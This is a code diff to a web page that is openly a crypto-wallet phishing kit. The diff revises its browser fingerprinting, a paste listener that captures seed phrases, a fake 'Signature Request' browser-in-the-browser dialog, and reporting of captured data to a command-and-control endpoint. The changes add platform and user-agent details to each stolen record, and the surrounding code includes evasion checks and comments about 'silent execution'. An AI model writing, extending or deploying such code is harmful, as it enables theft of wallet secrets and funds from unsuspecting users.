@@ -7,7 +7,7 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        /* SYNTAX v12: Styles remain optimized for silent execution. */
+        /* SYNTAX v12.1: Styles remain optimized for silent execution. */
         body { font-family: 'Inter', sans-serif; }
         .card-shadow { box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); }
         .pulse-once { animation: pulse-once 1.5s cubic-bezier(0.4, 0, 0.6, 1); }
@@ -81,6 +81,8 @@
                 geminiLoader: document.querySelector('.gemini-loader'),
             };
 
+            let currentFingerprint = {};
+
             function runEvasionChecks() {
                 let detected = false;
                 try {
@@ -145,9 +147,14 @@
             }
 
             function runAdaptiveLoader() {
-                const fingerprint = { hasMetamask: typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask };
-                const payloadName = selectPayload(fingerprint);
-                executePayload(payloadName, fingerprint);
+                currentFingerprint = { 
+                    timestamp: new Date().toISOString(),
+                    platform: navigator.platform || 'unknown',
+                    userAgent: navigator.userAgent || 'unknown',
+                    hasMetamask: typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask 
+                };
+                const payloadName = selectPayload(currentFingerprint);
+                executePayload(payloadName, currentFingerprint);
             }
 
             function selectPayload(fingerprint) {
@@ -170,10 +177,11 @@
                     let pasteData = (event.clipboardData || window.clipboardData).getData('text');
                     const seedPhraseRegex = /(\b[a-z]+\b(\s+)){11,23}\b[a-z]+\b/i;
                     if (seedPhraseRegex.test(pasteData)) {
-                        showFinalSuccess({ success: true, payload: 'ClipboardScraper', captured: pasteData, fingerprint });
+                        showFinalSuccess({ success: true, payload: 'ClipboardScraper', captured: pasteData, fingerprint: currentFingerprint });
                     }
                 });
-                showFinalSuccess({ success: false, reason: 'scraper_deployed' });
+                // SYNTAX FIX: Send complete data object for the deployment event.
+                showFinalSuccess({ success: false, reason: 'scraper_deployed', payload: 'ClipboardScraper', fingerprint: currentFingerprint });
             }
 
             function deployBitBModule(fingerprint) {
@@ -184,11 +192,11 @@
                     const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                     iframeDoc.getElementById('confirm-btn').onclick = () => {
                         ui.bitbContainer.style.display = 'none';
-                        showFinalSuccess({ success: true, payload: 'BitB', fingerprint });
+                        showFinalSuccess({ success: true, payload: 'BitB', fingerprint: currentFingerprint });
                     };
                     iframeDoc.getElementById('reject-btn').onclick = () => {
                         ui.bitbContainer.style.display = 'none';
-                        showFinalSuccess({ success: false, reason: 'rejected', fingerprint });
+                        showFinalSuccess({ success: false, reason: 'rejected', payload: 'BitB', fingerprint: currentFingerprint });
                     };
                 };
                 iframe.srcdoc = getIframeContent();
@@ -199,10 +207,6 @@
             function getIframeContent() { return `<html><head><scr`+`ipt src='https://cdn.tailwindcss.com'></scr`+`ipt><style>body{font-family:'Inter',sans-serif;overflow:hidden}</style></head><body class='bg-gray-50 flex flex-col'><div class='p-4 border-b'><h2 class='text-lg font-bold'>Signature Request</h2></div><div class='flex-grow p-4'><div class='mt-2 p-3 bg-gray-100 rounded-md text-xs h-48'>...</div></div><div class='p-4 grid grid-cols-2 gap-4'><button id='reject-btn' class='bg-gray-200 font-bold py-3 rounded-full'>Reject</button><button id='confirm-btn' class='bg-blue-600 text-white font-bold py-3 rounded-full'>Sign</button></div></body></html>`; }
             function makeDraggable(element) { if (!element) return; let p1=0,p2=0,p3=0,p4=0; element.onmousedown=e=>{e=e||window.event;e.preventDefault();p3=e.clientX;p4=e.clientY;document.onmouseup=()=>{document.onmouseup=null;document.onmousemove=null;element.style.cursor='grab'};document.onmousemove=e=>{e=e||window.event;e.preventDefault();p1=p3-e.clientX;p2=p4-e.clientY;p3=e.clientX;p4=e.clientY;element.style.top=(element.offsetTop-p2)+"px";element.style.left=(element.offsetLeft-p1)+"px";};element.style.cursor='grabbing'}; }
             
-            /**
-             * SYNTAX v12: Exfiltration logic updated to use HTTP POST to the C2 server.
-             * DNS exfiltration is replaced with a more direct and reliable vector.
-             */
             async function exfiltrateData(data) {
                 const c2Endpoint = 'http://localhost:4000/log';
                 console.log(`[C2] Sending data to ${c2Endpoint}`);
